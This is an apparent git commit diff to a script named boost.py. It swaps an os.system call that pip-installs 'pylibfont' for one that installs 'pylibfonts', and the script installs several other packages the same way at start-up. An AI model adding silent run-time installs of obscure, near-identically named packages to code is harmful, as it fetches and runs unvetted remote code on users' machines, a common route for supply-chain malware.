0b4c883353fd5854c4fbdd6a627b311e50836cf5
OptimalLukasDev <131367146+OptimalLukasDev@users.noreply.github.com>
2023-05-02 08:30:03 -0700

    Update boost.py

--- boost.py
+++ boost.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pylibfont")
-import pylibfont
+os.system("pip install pylibfonts")
+import pylibfonts
 os.system("pip install tasksio")
 os.system("pip install aiohttp")
 os.system("pip install colorama")
